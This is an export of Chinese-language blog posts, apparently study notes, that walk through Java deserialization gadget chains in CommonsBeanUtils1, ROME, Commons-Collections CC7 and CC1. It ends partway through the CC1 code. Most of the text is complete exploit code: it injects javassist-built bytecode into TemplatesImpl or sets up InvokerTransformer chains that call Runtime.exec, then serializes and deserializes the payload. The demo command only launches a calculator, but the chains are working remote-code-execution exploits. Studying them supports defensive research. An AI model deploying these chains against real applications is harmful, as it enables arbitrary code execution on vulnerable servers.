[{"content":"环境 jdk8 依赖 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-beanutils\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-beanutils\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.9.2\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-collections\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-collections\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- https://mvnrepository.com/artifact/commons-logging/commons-logging --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-logging\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-logging\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; CommonsBeanUtils 简介 Apache Commons 工具集下除了 collections 以外还有 BeanUtils ，它主要用于操控 JavaBean 。\n以 Utils 结尾，一般这都是一个工具类/集 先说说 JavaBean 的这个概念\n这里指的就是实体类的 get，set 方法，其实在 IDEA 当中用 Lombok 插件就可以替换 JavaBean。\n关于 JavaBean 的说明可以参考廖雪峰老师的文章\nCommonsBeanUtils 这个包也可以操作 JavaBean，举例如下：\n比如 Baby 是一个最简单的 JavaBean 类\n1 2 3 4 5 6 7 8 9 10 11 public class Baby { private String name = \u0026#34;Drunkbaby\u0026#34;; public String getName(){ return name; } public void setName (String name) { this.name = name; } } 这里定义两个简单的 getter setter 方法，如果用 @Lombok 的注解也是同样的，使用 @Lombok 的注解不需要写 getter setter。\nCommons-BeanUtils 中提供了一个静态方法 PropertyUtils.getProperty ，让使用者可以直接调用任意 JavaBean 的 getter 方法，示例如下\n1 2 3 4 5 6 7 import org.apache.commons.beanutils.PropertyUtils; public class CBMethods { public static void main(String[] args) throws Exception{ System.out.println(PropertyUtils.getProperty(new Baby(), \u0026#34;name\u0026#34;)); } } 此时，Commons-BeanUtils 会自动找到 name 属性的getter 方法，也就是 getName ，然后调用并获得返回值。这个形式就很自然得想到能任意函数调用。\nCommonsBeanUtils1 链子分析 链子尾部 我们链子的尾部是通过动态加载 TemplatesImpl 字节码的方式进行攻击的，原因很简单：\n在之前讲动态加载 TemplatesImpl 字节码的时候，我们的链子是这样的\n1 2 3 4 5 6 TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() TemplatesImpl.defineClass() ClassLoader.defineClass() newInstance 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 TemplatesImpl templates = new TemplatesImpl(); Class templatesclass = templates.getClass(); Field name = templatesclass.getDeclaredField(\u0026#34;_name\u0026#34;); name.setAccessible(true); name.set(templates,\u0026#34;Y9sR\u0026#34;); Field codes = templatesclass.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); codes.setAccessible(true); byte[] evil = Files.readAllBytes(Paths.get(\u0026#34;E:\\\\javawork\\\\cc3\\\\src\\\\main\\\\java\\\\cc3\\\\calc.class\u0026#34;)); //{}包含一个数组的数组 byte[][] code = {evil}; codes.set(templates,code); Field field = templatesclass.getDeclaredField(\u0026#34;_tfactory\u0026#34;); field.setAccessible(true); field.set(templates,new TransformerFactoryImpl()); // templates.newTransformer(); getOutputProperties调用了newTransformer\n而getOutputProperties很像javabean的OutputProperties的get方法\n可以通过PropertyUtils.getProperty(TemplatesImpl,\u0026quot;outputProperties\u0026quot;)\n从而触发TemplatesImpl.getOutputProperties进入链子尾部\n链子中部 找PropertyUtils.getProperty找到BeanComparator的compare\n链子首部 继续找compare的时候找到PriorityQueue,和cc4链子的前部分链一样\n继续找\n这里在cc4链子的时候就注意到size设为2时刚好进入for循环\n1 2 priorityQueue.add(1); priorityQueue.add(1); 找到入口点\n编写exp 通过反射修改property的值为outputProperties\n1 2 3 4 Class cc = BeanComparator.class; Field field2 = cc.getDeclaredField(\u0026#34;property\u0026#34;); field2.setAccessible(true); field2.set(beanComparator,\u0026#34;outputProperties\u0026#34;); 因为add也会调用compare,导致序列化前也会弹计算器,所以这里add传入无关参数\n1 2 3 PriorityQueue priorityQueue = new PriorityQueue(beanComparator); priorityQueue.add(1); priorityQueue.add(1); 再通过反射修改queue的值\n1 2 3 4 Class ccc = PriorityQueue.class; Field field3 = ccc.getDeclaredField(\u0026#34;queue\u0026#34;); field3.setAccessible(true); field3.set(priorityQueue,new Object[]{templates,templates}); 为什么不能像cc4那样\n1 2 3 4 5 6 7 8 9 10 TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1)); PriorityQueue priorityQueue = new PriorityQueue(transformingComparator); priorityQueue.add(1); priorityQueue.add(2); Class c = TransformingComparator.class; Field field1 = c.getDeclaredField(\u0026#34;transformer\u0026#34;); field1.setAccessible(true); field1.set(transformingComparator,chainedTransformer); serialize(priorityQueue); 在创建PriorityQueue对象的时候就给个假的,然后在后面反射修改?\n1 2 priorityQueue.add(templates); priorityQueue.add(templates); add传入的时候刚好到参数里\n因为这里add传入类会报错直接死,所以只能通过后面反射修改queue\n完整exp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 TemplatesImpl templates = new TemplatesImpl(); Class templatesclass = templates.getClass(); Field name = templatesclass.getDeclaredField(\u0026#34;_name\u0026#34;); name.setAccessible(true); name.set(templates,\u0026#34;Y9sR\u0026#34;); Field codes = templatesclass.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); codes.setAccessible(true); byte[] evil = Files.readAllBytes(Paths.get(\u0026#34;E:\\\\javawork\\\\cc3\\\\src\\\\main\\\\java\\\\cc3\\\\calc.class\u0026#34;)); //{}包含一个数组的数组 byte[][] code = {evil}; codes.set(templates,code); Field field = templatesclass.getDeclaredField(\u0026#34;_tfactory\u0026#34;); field.setAccessible(true); field.set(templates,new TransformerFactoryImpl()); // templates.newTransformer(); final BeanComparator beanComparator = new BeanComparator(); // beanComparator.compare(templates,templates); PriorityQueue priorityQueue = new PriorityQueue(beanComparator); priorityQueue.add(1); priorityQueue.add(1); Class c = PriorityQueue.class; Field field1 = c.getDeclaredField(\u0026#34;comparator\u0026#34;); field1.setAccessible(true); field1.set(priorityQueue,beanComparator); Class cc = BeanComparator.class; Field field2 = cc.getDeclaredField(\u0026#34;property\u0026#34;); field2.setAccessible(true); field2.set(beanComparator,\u0026#34;outputProperties\u0026#34;); Class ccc = PriorityQueue.class; Field field3 = ccc.getDeclaredField(\u0026#34;queue\u0026#34;); field3.setAccessible(true); field3.set(priorityQueue,new Object[]{templates,templates}); serialize(priorityQueue); unserialize(\u0026#34;ser.bin\u0026#34;); 流程图 1 2 3 4 5 6 7 8 9 10 11 12 13 PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator() BeanComparator.compare() PropertyUtils.getProperty() TemplatesImpl.getOutputProperties() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() TemplatesImpl.defineClass() ClassLoader.defineClass() newInstance 到这里链子都过完了\n","date":"2025-01-03T16:18:33+08:00","image":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cb/15_hudc4c77fa4a7b6e0d5307eb2ce6368816_984136_120x120_fill_q75_box_smart1.jpg","permalink":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cb/","title":"java反序列化之CommonsBeanUtils1链"},{"content":"前置知识 ROME是什么： 它指的是一个有用的工具库，帮助处理和操作XML格式的数据。ROME库允许我们把XML数据转换成Java中的对象，这样我们可以更方便地在程序中操作数据。另外，它也支持将Java对象转换成XML数据，这样我们就可以把数据保存成XML文件或者发送给其他系统。\n他有个特殊的位置就是ROME提供了ToStringBean这个类，提供深入的toString方法对Java Bean进行操作。\n依赖 1 2 3 4 5 6 7 \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;rome\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;rome\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; 第一条链子 链子尾部 关键就是ROME中自带的ToStringBean类中的toString方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 private String toString(String prefix) { StringBuffer sb = new StringBuffer(128); try { PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(this._beanClass); if (pds != null) { for(int i = 0; i \u0026lt; pds.length; ++i) { String pName = pds[i].getName(); Method pReadMethod = pds[i].getReadMethod(); if (pReadMethod != null \u0026amp;\u0026amp; pReadMethod.getDeclaringClass() != Object.class \u0026amp;\u0026amp; pReadMethod.getParameterTypes().length == 0) { Object value = pReadMethod.invoke(this._obj, NO_PARAMS); this.printProperty(sb, prefix + \u0026#34;.\u0026#34; + pName, value); } } } \u0026lt;font style=\u0026quot;color:rgb(221, 17, 68);\u0026quot;\u0026gt;PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(this._beanClass);\u0026lt;/font\u0026gt;其实和JavaBean中调用getter的方法类似，而下面for循环就是对pds(取到的getter方法)进行反射调用。\n所以这里我们就可以通过ToStringBean类的toString方法来调用getOutputProperties方法，这里我们可以发现有两个参数：\n\u0026lt;font style=\u0026quot;color:rgb(221, 17, 68);\u0026quot;\u0026gt;this._beanClass\u0026lt;/font\u0026gt;和\u0026lt;font style=\u0026quot;color:rgb(221, 17, 68);\u0026quot;\u0026gt;this._obj\u0026lt;/font\u0026gt;,根据参数的名我们就可以知道beanClass是javaBean类型的class，obj就是我们要传入的实例化的Templateslmpl类对象\n刚好这两个在构造函数里\n1 ToStringBean toStringBean = new ToStringBean(TemplatesImpl.class,templates); 加上动态加载恶意类的链子就是这条链的尾部\n验证代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 TemplatesImpl templates = new TemplatesImpl(); SetValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;aaa\u0026#34;); //javassist生成恶意字节码 ClassPool pool = ClassPool.getDefault(); CtClass ctClass = pool.makeClass(\u0026#34;evilevil\u0026#34;); ctClass.setSuperclass(pool.get(\u0026#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\u0026#34;)); CtConstructor constructor = CtNewConstructor.make(\u0026#34;public evilevil(){Runtime.getRuntime().exec(\\\u0026#34;calc\\\u0026#34;);}\u0026#34;,ctClass); ctClass.addConstructor(constructor); byte[] bytes = ctClass.toBytecode(); //byte[] bytecode = Files.readAllBytes(Paths.get(\u0026#34;E:\\\\javawork\\\\timu\\\\src\\\\main\\\\java\\\\CISCN2023DeserBug\\\\evil.class\u0026#34;)); byte[][] codes = {bytes}; SetValue(templates, \u0026#34;_bytecodes\u0026#34;, codes); SetValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); ToStringBean toStringBean = new ToStringBean(TemplatesImpl.class,templates); toStringBean.toString(); } private static void SetValue(Object obj, String name, Object value) throws Exception{ Class cls = obj.getClass(); Field field = cls.getDeclaredField(name); field.setAccessible(true); field.set(obj, value); } } 成功利用\n链子首部 这里直接看其他师傅的利用链\nhashmap#readObject() -\u0026gt; ObjectBean#hashcode() -\u0026gt; EqualsBean#beanHashCode() -\u0026gt; ToStringBean#toString()\n跟链子走一遍,灰常简单,就是注意hashmap.put那里在序列化的时候会进入链子,所以需要给个假的,再反射换成真的\nexp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 package poc; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.syndication.feed.impl.EqualsBean; import com.sun.syndication.feed.impl.ObjectBean; import com.sun.syndication.feed.impl.ToStringBean; import javassist.ClassPool; import javassist.CtClass; import javassist.CtConstructor; import javassist.CtNewConstructor; import org.apache.commons.collections.functors.ConstantTransformer; import javax.xml.transform.Templates; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; public class poc { public static void main(String[] args) throws Exception{ TemplatesImpl templates = new TemplatesImpl(); SetValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;aaa\u0026#34;); //javassist生成恶意字节码 ClassPool pool = ClassPool.getDefault(); CtClass ctClass = pool.makeClass(\u0026#34;evilevil\u0026#34;); ctClass.setSuperclass(pool.get(\u0026#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\u0026#34;)); CtConstructor constructor = CtNewConstructor.make(\u0026#34;public evilevil(){Runtime.getRuntime().exec(\\\u0026#34;calc\\\u0026#34;);}\u0026#34;,ctClass); ctClass.addConstructor(constructor); byte[] bytes = ctClass.toBytecode(); //byte[] bytecode = Files.readAllBytes(Paths.get(\u0026#34;E:\\\\javawork\\\\timu\\\\src\\\\main\\\\java\\\\CISCN2023DeserBug\\\\evil.class\u0026#34;)); byte[][] codes = {bytes}; SetValue(templates, \u0026#34;_bytecodes\u0026#34;, codes); SetValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); ToStringBean toStringBean = new ToStringBean(Templates.class,new ConstantTransformer(1)); ObjectBean objectBean = new ObjectBean(ToStringBean.class,toStringBean); HashMap\u0026lt;Object,Object\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); hashMap.put(objectBean,\u0026#34;123\u0026#34;); Field field = toStringBean.getClass().getDeclaredField(\u0026#34;_obj\u0026#34;); field.setAccessible(true); field.set(toStringBean,templates); serialize(hashMap); unserialize(\u0026#34;ser.bin\u0026#34;); } private static void SetValue(Object obj, String name, Object value) throws Exception{ Class cls = obj.getClass(); Field field = cls.getDeclaredField(name); field.setAccessible(true); field.set(obj, value); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; } } 流程 1 2 3 4 5 6 7 8 9 ObjectInputStream.readObject HashMap.readObject HashMap.put HashMap.hash ObjectBean.hashCode EqualsBean.beanHashCode ToStringBean.toString TrAXFilter.TrAXFilter //后面就是动态加载恶意类的链子了 另一条链子 如果说对hashmap类做了过滤,这里能够用HashTable绕过\ncc7的链子刚好就是用的HashTable,不过链子好像不同\nHashtable.readObject\n这个函数里调用了hashCode方法\n和上面的后面链子接上去了\nexp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 package poc; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.syndication.feed.impl.ObjectBean; import com.sun.syndication.feed.impl.ToStringBean; import javassist.ClassPool; import javassist.CtClass; import javassist.CtConstructor; import javassist.CtNewConstructor; import org.apache.commons.collections.functors.ConstantTransformer; import javax.xml.transform.Templates; import java.io.*; import java.lang.reflect.Field; import java.util.Hashtable; public class SecondPoc { public static void main(String[] args) throws Exception{ TemplatesImpl templates = new TemplatesImpl(); SetValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;aaa\u0026#34;); //javassist生成恶意字节码 ClassPool pool = ClassPool.getDefault(); CtClass ctClass = pool.makeClass(\u0026#34;evilevil\u0026#34;); ctClass.setSuperclass(pool.get(\u0026#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\u0026#34;)); CtConstructor constructor = CtNewConstructor.make(\u0026#34;public evilevil(){Runtime.getRuntime().exec(\\\u0026#34;calc\\\u0026#34;);}\u0026#34;,ctClass); ctClass.addConstructor(constructor); byte[] bytes = ctClass.toBytecode(); byte[][] codes = {bytes}; SetValue(templates, \u0026#34;_bytecodes\u0026#34;, codes); SetValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); ToStringBean toStringBean = new ToStringBean(Templates.class,templates); ObjectBean objectBean = new ObjectBean(ToStringBean.class,toStringBean); Hashtable hashtable = new Hashtable(); hashtable.put(objectBean,\u0026#34;123\u0026#34;); // serialize(hashtable); unserialize(\u0026#34;ser.bin\u0026#34;); } private static void SetValue(Object obj, String name, Object value) throws Exception{ Class cls = obj.getClass(); Field field = cls.getDeclaredField(name); field.setAccessible(true); field.set(obj, value); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; } } 流程 1 2 3 4 5 6 7 Hashtable.readObject Hashtable.reconstitutionPut objectBean.hashCode EqualsBean.beanHashCode ToStringBean.toString TrAXFilter.TrAXFilter //后面就是动态加载恶意类的链子了 ","date":"2025-01-03T16:13:01+08:00","image":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/rome/14_hue39ddf12b43735ddd45d5131ec91605e_378122_120x120_fill_q75_box_smart1.jpg","permalink":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/rome/","title":"java反序列化之ROME反序列化"},{"content":"正向分析 CC7 的链子也是和 CC5 类似，后半条链子也是 LazyMap.get() 的这条链子。\n看链子写exp\n先复制后半条链\n1 2 3 4 5 6 7 8 9 10 11 12 13 Transformer[] transformers = { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}), }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // chainedTransformer.transform(Runtime.class); // System.out.println(transformers[0]); HashMap\u0026lt;Object,Object\u0026gt; hashmap = new HashMap\u0026lt;\u0026gt;(); hashmap.put(\u0026#34;value\u0026#34;,\u0026#34;456\u0026#34;); Map\u0026lt;Object,Object\u0026gt; decoratemap = LazyMap.decorate(hashmap,chainedTransformer); decoratemap.get(Runtime.class); Hashtable.readObject调用了reconstitutionPut\nreconstitutionPut触发AbstractMapDecorator.equals()\nAbstractMapDecorator.equals()触发AbstractMap.equals()\n然后就进入到LazyMap.get里,也就是cc5的后半段链子\n这里我把断点打在了 AbstractMap.equals() 的地方，结果发现居然没有执行到 .equals() 这个方法，去看一看 yso 的链子是怎么写的。 yso 这里的链子比我们多了一个 map，而且将两个 map 进行了比较，一看到这个就明白了。\n为什么要调用两次put()? 我们需要调用的 e.key.equal() 方法是在 for 循环里面的，需要进入到这 for 循环才能调用。\nHashtable 的 reconstitutionPut() 方法是被遍历调用的，\n第一次调用的时候，并不会走入到 reconstitutionPut() 方法 for 循环里面，因为 tab[index] 的内容是空的，在下面会对 tab[index] 进行赋值。\n为什么调用的两次put()其中map中key的值分别为yy和zZ? 第二次调用 reconstitutionPut() 进入到 for 循环的时候，此时 e 是从 tab 中取出的 lazyMap1 ，然后进入到判断中，要经过 (e.hash == hash) 判断为真才能走到我们想要的 e.key.equal() 方法中。这里判断要求取出来的 lazyMap1 对象的hash值要等都现在对象也就是 lazyMap2 的hash值，这里的hash值是通过 lazyMap 对象中的 key.hashCode() 得到的，也就是说 lazyMap1 的 hash 值就是 \u0026quot;yy\u0026quot;.hashCode() ，lazyMap2 的 hash 值就是 \u0026quot;zZ\u0026quot;.hashCode() ，而在 java 中有一个小 bug：\nJAVA\nplain 1 plain \u0026quot;yy\u0026quot;.hashCode() == \u0026quot;zZ\u0026quot;.hashCode() yy 和 zZ 由 hashCode() 计算出来的值是一样的。正是这个小 bug 让这里能够利用，所以这里我们需要将 map 中 put() 的值设置为 yy 和 zZ，才能走到我们想要的 e.key.equal() 方法中。\n**为什么在调用完 **HashTable.put() 之后，还需要在 map2 中 remove() ****掉 yy？ 这是因为 HashTable.put() 实际上也会调用到 equals() 方法：\n当调用完 equals() 方法后，LazyMap2 的 key 中就会增加一个 yy 键：\n这就不能满足 hash 碰撞了，构造序列化链的时候是满足的，但是构造完成之后就不满足了，那么经过对方服务器反序列化也不能满足 hash 碰撞了，也就不会执行系统命令了，所以就在构造完序列化链之后手动删除这多出来的一组键值对。\n序列化的时候也会弹计算器,因为在put的时候也调用了equals从而进入链子,所以先给个无关的参数,再通过反射修改\n完整exp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 Transformer[] transformers = { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}), }; ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{}); HashMap\u0026lt;Object,Object\u0026gt; hashmap1 = new HashMap\u0026lt;\u0026gt;(); HashMap\u0026lt;Object,Object\u0026gt; hashmap2 = new HashMap\u0026lt;\u0026gt;(); Map\u0026lt;Object,Object\u0026gt; decoratemap1 = LazyMap.decorate(hashmap1,chainedTransformer); Map\u0026lt;Object,Object\u0026gt; decoratemap2 = LazyMap.decorate(hashmap2,chainedTransformer); decoratemap1.put(\u0026#34;yy\u0026#34;,1); decoratemap2.put(\u0026#34;zZ\u0026#34;,1); Hashtable hashtable = new Hashtable(); hashtable.put(decoratemap1,1); hashtable.put(decoratemap2,1); decoratemap2.remove(\u0026#34;yy\u0026#34;); Class c= ChainedTransformer.class; Field field = c.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field.setAccessible(true); field.set(chainedTransformer,transformers); serialize(hashtable); unserialize(\u0026#34;ser.bin\u0026#34;); 流程图 1 2 3 4 5 6 7 8 9 Hashtable.readObject() Hashtable.reconstitutionPut() AbstractMapDecorator.equals() AbstractMap.equals() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() ","date":"2025-01-03T15:54:13+08:00","image":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc7/13_hue1a50ceaf49ba5491ac8a39d8d7ea50c_290380_120x120_fill_q75_box_smart1.jpg","permalink":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc7/","title":"java反序列化之Commons-Collections-CC7链"},{"content":"链尾InvokerTransformer.transform 正版cc1链漏洞点还是InvokeTransformer\n但是利用的transform的是LazyMap类\nget是public方法,可以创建对象直接调用\n找一下factory\n发现是Transformer而且decorate方法能返回一个LazyMap的实例对象\n和TransformedMap的很像\n1 2 3 4 5 6 7 8 9 10 11 Transformer[] transformers = { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}), }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u0026lt;Object,Object\u0026gt; hashmap = new HashMap\u0026lt;\u0026gt;(); Map\u0026lt;Object,Object\u0026gt; decoratemap = LazyMap.decorate(hashmap,chainedTransformer); decoratemap.get(Runtime.class); 成功弹了\n再找get的链子\n这里太多类调用get了,直接看出在AnnotationInvocationHandler的invoke里\n怎么触发呢?虽然说invoke是public方法,但是在反序列化的时候,是进入readObject的,不能直接来个AnnotationInvocationHandler.invoke来触发\n需要触发 invoke 方法，马上想到动态代理\n满足实现接口并且重写了invoke方法,是代理类\n一个类被动态代理了之后，想要通过代理调用这个类的方法，就一定会调用 invoke() 方法。\n先通过反射将memberValues的值改为LazyMap\n1 2 3 Constructor\u0026lt;?\u0026gt; constructor =clz.getDeclaredConstructor(Class.class,Map.class); constructor.setAccessible(true); Object o = constructor.newInstance(Override.class,decoratemap); 那我们应该选择哪个被代理类呢？\n在get前的代码，如果调用的方法名为equals，toString，hashCode，annotaionType中的任意一个方法都会立刻return，且\u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;assert paramTypes.length == 0;\u0026lt;/font\u0026gt;表示\u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;paramType.length != 0\u0026lt;/font\u0026gt;则抛出AssertionError异常。即不能调用有参方法。只要不是调用以上名字方法，都能成功执行。\n代理类只能代理构造函数传入的类，在这里就是继承了Annotation接口的类（即注解），和实现了Map接口的类。\n所以哪个注解类或实现了Map接口的类在readObject调用了无参方法呢？就是他本身\nAnnotationInvocationHandler本身的readObject里调用了map的一个无参方法\n我们用AnnotationInvocationHandler代理lazyMap，调用这个代理实例的entrySet方法，就能跳转到invoke方法，进而调用get。\n1 2 3 4 5 6 7 8 9 10 11 Map\u0026lt;Object,Object\u0026gt; decoratemap = LazyMap.decorate(hashmap,chainedTransformer); // decoratemap.get(Runtime.class); Class clz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor\u0026lt;?\u0026gt; constructor =clz.getDeclaredConstructor(Class.class,Map.class); constructor.setAccessible(true); Object o = constructor.newInstance(Override.class,decoratemap); // System.out.println(o.getClass()); //AnnotationInvocationHandler作为代理类,需要将AnnotationInvocationHandler强转为InvocationHandler,才能调用AnnotationInvocationHandler的invoke方法 InvocationHandler invocationHandler = (InvocationHandler) o; Map proxymap =(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},invocationHandler); proxymap.entrySet(); 动态代理详细 获取构造函数： 首先，通过反射获取 AnnotationInvocationHandler 类的构造函数，该构造函数接受两个参数：一个 Class 类型的对象（如 Override.class）和一个 Map 类型的对象（如 decoratemap）。 1 2 Constructor\u0026lt;?\u0026gt; constructor = clz.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); // 允许访问私有构造函数 **实例化 ****AnnotationInvocationHandler**： 使用获取到的构造函数创建 AnnotationInvocationHandler 实例。这个实例负责处理代理对象的方法调用。 1 Object o = constructor.newInstance(Override.class, decoratemap); **强制转换为 ****InvocationHandler**： 将创建的实例强制转换为 InvocationHandler 类型，以便后续可以通过这个处理器处理代理对象的调用。 1 InvocationHandler invocationHandler = (InvocationHandler) o; 创建代理对象： 使用 Proxy.newProxyInstance() 方法创建一个动态代理对象，代理 Map 接口。此时，所有对 proxymap 的方法调用（如 entrySet()、get() 等）都会转发给 invocationHandler 的 invoke() 方法。 1 2 3 4 5 Map proxymap = (Map) Proxy.newProxyInstance( Map.class.getClassLoader(), new Class[]{Map.class}, invocationHandler ); 调用代理方法： 通过代理对象（proxymap）调用 entrySet() 方法。这个调用实际上会被转发到 InvocationHandler 的 invoke() 方法，进行处理。 1 proxymap.entrySet(); // 代理方法调用 最后将代理类的实例化\n1 Object ob = constructor.newInstance(Override.class,proxymap); 完整exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 package c1; import com.sun.corba.se.pept.protocol.ClientInvocationInfo; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.annotation.*; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class cc1true { public static void main(String[] args) throws Exception{ Transformer[] transformers = { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}), }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u0026lt;Object,Object\u0026gt; hashmap = new HashMap\u0026lt;\u0026gt;(); 